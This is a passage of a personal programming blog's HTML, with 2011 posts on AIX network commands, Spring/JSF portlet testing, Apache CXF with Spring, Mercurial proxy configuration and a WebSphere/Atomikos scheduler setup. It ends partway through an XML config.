<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsdev -Cc adapter</span><br><span class="line">lsslot -c pci|grep ent</span><br><span class="line">netstat -v ent0</span><br><span class="line">netstat -r</span><br><span class="line">netstat -in ent0</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Spring-test-+-JSF-1.2-+-Portlet" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-10-20T02:04:54.000Z"><a href="/2011/10/20/Spring-test-+-JSF-1.2-+-Portlet/">2011-10-20</a></time>
      
      
  
    <h1 class="title"><a href="/2011/10/20/Spring-test-+-JSF-1.2-+-Portlet/">Spring-test + JSF 1.2 + Portlet</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>jsf Bean </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@Scope(&quot;request&quot;)</span><br><span class="line">public class FooBean extends AbstractRequestBean &#123;</span><br><span class="line">  private static final Logger log = Logger</span><br><span class="line">      .getLogger(FooBean.class);</span><br><span class="line"></span><br><span class="line">  @Autowired</span><br><span class="line">  private FooService service;</span><br><span class="line"></span><br><span class="line">  private String user;</span><br><span class="line"></span><br><span class="line">  public void setFooService(FooService service)&#123;</span><br><span class="line">    this.service = service;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String hi()&#123;</span><br><span class="line">    String str = getLoginUser() + &quot; say hi to &quot; + getUser();</span><br><span class="line">    getPortletRequest().setAttribute(&quot;message&quot;, str);</span><br><span class="line">    return &quot;bar&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setUser(String user)&#123;</span><br><span class="line">    this.user = user;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getUser()&#123;</span><br><span class="line">    return user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  AbstractRequestBean </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import javax.faces.context.FacesContext;</span><br><span class="line">import javax.portlet.PortletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">public abstract class AbstractRequestBean &#123;</span><br><span class="line">  private String loginUser;</span><br><span class="line">  private PortletRequest portletRequest;</span><br><span class="line">  private HttpServletRequest servletRequest;</span><br><span class="line"></span><br><span class="line">  public String getLoginUser() &#123;</span><br><span class="line">    if (loginUser == null)</span><br><span class="line">      return User.getCurrentUser(getPortletRequest()).getUsername();</span><br><span class="line"></span><br><span class="line">    return loginUser;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setLoginUser(String loginUser) &#123;</span><br><span class="line">    this.loginUser = loginUser;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public PortletRequest getPortletRequest() &#123;</span><br><span class="line">    if (portletRequest == null)</span><br><span class="line">      return (PortletRequest) FacesContext.getCurrentInstance()</span><br><span class="line">          .getExternalContext().getRequest();</span><br><span class="line"></span><br><span class="line">    return portletRequest;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // for jsp/servlet call directly, not jsf bean</span><br><span class="line">  public HttpServletRequest getServletRequest() &#123;</span><br><span class="line">    if (servletRequest == null)</span><br><span class="line">      return (HttpServletRequest) FacesContext.getCurrentInstance()</span><br><span class="line">          .getExternalContext().getRequest();</span><br><span class="line"></span><br><span class="line">    return servletRequest;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setServletRequest(HttpServletRequest servletRequest) &#123;</span><br><span class="line">    this.servletRequest = servletRequest;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setPortletRequest(PortletRequest portletRequest) &#123;</span><br><span class="line">    this.portletRequest = portletRequest;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  FooTest </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@ContextConfiguration(locations = &quot;/applicationContext.xml&quot;)</span><br><span class="line">public class FooTest extends AbstractJUnit38SpringContextTests &#123;</span><br><span class="line"></span><br><span class="line">  @Autowired</span><br><span class="line">  private FooService service;;</span><br><span class="line"></span><br><span class="line">  public void testHi()&#123;</span><br><span class="line">    FooBean bean = new FooBean();</span><br><span class="line">    MockPortletRequest request = new MockPortletRequest();</span><br><span class="line">    MockPortletSession session = new MockPortletSession();</span><br><span class="line">    session.setAttribute(FooBean.class.getName()</span><br><span class="line">        + &quot;/programme&quot;, &quot;06721&quot;, PortletSession.APPLICATION_SCOPE);</span><br><span class="line">    request.setSession(session);</span><br><span class="line">    bean.setPortletRequest(request);</span><br><span class="line">    bean.setLoginUser(&quot;Jay&quot;);</span><br><span class="line"></span><br><span class="line">    bean.setService(service);</span><br><span class="line">    bean.hi(&quot;Forest&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Apache-CXF-+-Spring" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-09-28T03:15:52.000Z"><a href="/2011/09/28/Apache-CXF-+-Spring/">2011-09-28</a></time>
      
      
  
    <h1 class="title"><a href="/2011/09/28/Apache-CXF-+-Spring/">Apache CXF + Spring</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>  比较了Spring WS和Apache CXF，觉得Spring WS属于contract-first类型的WebService，自己不熟悉xsd，<br>  所以使用Apache CXF这个组件，而且它的功能更为强大并且可以与Spring整合。<br>  部署在tomcat上，然后访问 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/foo/HelloWorld?wsdl">http://127.0.0.1:8080/foo/HelloWorld?wsdl</a> </p>
<p>  applicationContext.xml </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">	xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">	xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">	xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;</span><br><span class="line">	xmlns:jaxws=&quot;http://cxf.apache.org/jaxws&quot;</span><br><span class="line">	xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-2.5.xsd</span><br><span class="line">	http://cxf.apache.org/jaxws http://cxf.apache.org/schemas/jaxws.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;context:component-scan base-package=&quot;xx&quot; /&gt;</span><br><span class="line">	&lt;context:annotation-config /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;entityManagerFactory&quot;</span><br><span class="line">		class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">			value=&quot;classpath:META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceUnitName&quot; value=&quot;someDB&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;transactionManager&quot;</span><br><span class="line">		class=&quot;org.springframework.orm.jpa.JpaTransactionManager&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;entityManagerFactory&quot;</span><br><span class="line">			ref=&quot;entityManagerFactory&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;tx:advice id=&quot;syncAdvice&quot;</span><br><span class="line">		transaction-manager=&quot;transactionManager&quot;&gt;</span><br><span class="line">		&lt;tx:attributes&gt;</span><br><span class="line">			&lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot; /&gt;</span><br><span class="line">			&lt;tx:method name=&quot;*&quot; read-only=&quot;false&quot; /&gt;</span><br><span class="line">		&lt;/tx:attributes&gt;</span><br><span class="line">	&lt;/tx:advice&gt;</span><br><span class="line"></span><br><span class="line">	&lt;aop:config&gt;</span><br><span class="line">		&lt;aop:pointcut id=&quot;syncOperation&quot;</span><br><span class="line">			expression=&quot;execution(public * xx..*Service.*(..))&quot; /&gt;</span><br><span class="line">		&lt;aop:advisor advice-ref=&quot;syncAdvice&quot;</span><br><span class="line">			pointcut-ref=&quot;syncOperation&quot; /&gt;</span><br><span class="line">	&lt;/aop:config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;import resource=&quot;classpath:META-INF/cxf/cxf.xml&quot; /&gt;</span><br><span class="line">	&lt;import resource=&quot;classpath:META-INF/cxf/cxf-extension-soap.xml&quot; /&gt;</span><br><span class="line">	&lt;import resource=&quot;classpath:META-INF/cxf/cxf-servlet.xml&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jaxws:endpoint id=&quot;helloWorld&quot; implementor=&quot;#helloWorldService&quot;</span><br><span class="line">		address=&quot;/HelloWorld&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jaxws:client id=&quot;helloWorldClient&quot;</span><br><span class="line">		serviceClass=&quot;xx.HelloWorld&quot;</span><br><span class="line">		address=&quot;http://localhost:8080/shape/shape2sp&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<p>web.xml </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot; version=&quot;2.4&quot;&gt;</span><br><span class="line">	&lt;listener&gt;</span><br><span class="line">		&lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">	&lt;/listener&gt;</span><br><span class="line">	&lt;servlet&gt;</span><br><span class="line">		&lt;servlet-name&gt;CXFServlet&lt;/servlet-name&gt;</span><br><span class="line">		&lt;display-name&gt;CXF Servlet&lt;/display-name&gt;</span><br><span class="line">		&lt;servlet-class&gt;</span><br><span class="line">			org.apache.cxf.transport.servlet.CXFServlet</span><br><span class="line">		&lt;/servlet-class&gt;</span><br><span class="line">		&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">	&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">	&lt;servlet-mapping&gt;</span><br><span class="line">		&lt;servlet-name&gt;CXFServlet&lt;/servlet-name&gt;</span><br><span class="line">		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">	&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<p>  HelloWorld.java </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package xx;</span><br><span class="line"></span><br><span class="line">@WebService</span><br><span class="line">public interface HelloWorld &#123;</span><br><span class="line">  void sayHi(String user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>   HelloWorldService.java </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package xx;</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">@WebService(endpointInterface = &quot;xx.HelloWorld&quot;, serviceName = &quot;HelloWorld&quot;)</span><br><span class="line">public class HelloWorldService implements HelloWorld&#123;</span><br><span class="line">  public void sayHi(String user)&#123;</span><br><span class="line">    System.out.println(&quot;hello: &quot; + user);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-我的chrome-extension" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-09-15T08:53:09.000Z"><a href="/2011/09/15/%E6%88%91%E7%9A%84chrome-extension/">2011-09-15</a></time>
      
      
  
    <h1 class="title"><a href="/2011/09/15/%E6%88%91%E7%9A%84chrome-extension/">我的chrome extension</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/jlhlebbhengjlhmcjebbkambaekglhkf">Bubble Translate</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/hehijbfgiekmjfkfjpbkbammjbdenadd">IE Tab</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/lfkgmnnajiljnolcgolmmgnecgldgeld">Smooth Gestures</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/mgijmajocgfcbeboacabfgobmjgjcoja">google directory</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/lopabhfecdfhgogdbojmaicoicjekelh?hl=en">cookie.txt export</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/jegimleidpfmpepbfajjlielaheedkdo">colorPicker</a><br><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/alelhddbbhepgpmgidjdcjakblofbmce">Awesome Screenshot: Capture &amp; Annotate</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-hg-config" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-09-14T09:17:52.000Z"><a href="/2011/09/14/hg-config/">2011-09-14</a></time>
      
      
  
    <h1 class="title"><a href="/2011/09/14/hg-config/">hg config</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><code>hg --config=http_proxy.host=proxyhost:8080 clone https://xx@code.google.com/p/projectname/</code></p>
<p>hgrc </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[paths]</span><br><span class="line">default = https://xx@code.google.com/p/projectname/</span><br><span class="line">[ui]</span><br><span class="line">username = xx</span><br><span class="line"></span><br><span class="line">[extensions]</span><br><span class="line">extdiff =</span><br><span class="line">[extdiff]</span><br><span class="line">cmd.bc = C:/Program Files (x86)/Beyond Compare 3/BComp.exe</span><br><span class="line">opts.bc = /ro</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">host = proxyserver:8080</span><br><span class="line">user =</span><br><span class="line">passwd =</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Websphere下的Scheduler" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-09-06T01:41:48.000Z"><a href="/2011/09/06/Websphere%E4%B8%8B%E7%9A%84Scheduler/">2011-09-06</a></time>
      
      
  
    <h1 class="title"><a href="/2011/09/06/Websphere%E4%B8%8B%E7%9A%84Scheduler/">Websphere下的Scheduler</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>项目需要些一个在Websphere下写一个Scheduler，很自然想到使用Quartz，可是总出现unmanaged thead的问题，<br>折腾多时最后放弃使用org.springframework.transaction.jta.WebSphereUowTransactionManager，改用<br>com.atomikos.icatch.jta.UserTransactionManager，问题就解决了</p>
<p>applicationContext.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">	xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">	xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">	xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;</span><br><span class="line">	xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-2.5.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;context:component-scan base-package=&quot;xx.yy&quot; /&gt;</span><br><span class="line">	&lt;context:annotation-config /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jee:jndi-lookup id=&quot;spds&quot; jndi-name=&quot;jdbc/X1&quot;</span><br><span class="line">		cache=&quot;true&quot; expected-type=&quot;javax.sql.DataSource&quot;</span><br><span class="line">		lookup-on-startup=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jee:jndi-lookup id=&quot;srsds&quot; jndi-name=&quot;jdbc/X2&quot;</span><br><span class="line">		cache=&quot;true&quot; expected-type=&quot;javax.sql.DataSource&quot;</span><br><span class="line">		lookup-on-startup=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jee:jndi-lookup id=&quot;casds&quot; jndi-name=&quot;jdbc/X3&quot;</span><br><span class="line">		cache=&quot;true&quot; expected-type=&quot;javax.sql.DataSource&quot;</span><br><span class="line">		lookup-on-startup=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;entityManagerFactory&quot;</span><br><span class="line">		class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">			value=&quot;classpath:META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceUnitName&quot; value=&quot;sp&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;dataSource&quot; ref=&quot;spds&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;srsEntityManagerFactory&quot;</span><br><span class="line">		class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">			value=&quot;classpath:META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceUnitName&quot; value=&quot;srs&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;dataSource&quot; ref=&quot;srsds&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;casEntityManagerFactory&quot;</span><br><span class="line">		class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">			value=&quot;classpath:META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;persistenceUnitName&quot; value=&quot;cas&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;dataSource&quot; ref=&quot;casds&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;AtomikosTransactionManager&quot;</span><br><span class="line">		class=&quot;com.atomikos.icatch.jta.UserTransactionManager&quot;</span><br><span class="line">		init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;property name=&quot;forceShutdown&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;AtomikosUserTransaction&quot;</span><br><span class="line">		class=&quot;com.atomikos.icatch.jta.UserTransactionImp&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;transactionTimeout&quot; value=&quot;300&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;transactionManager&quot;</span><br><span class="line">		class=&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;transactionManager&quot;</span><br><span class="line">			ref=&quot;AtomikosTransactionManager&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;userTransaction&quot; ref=&quot;AtomikosUserTransaction&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;tx:advice 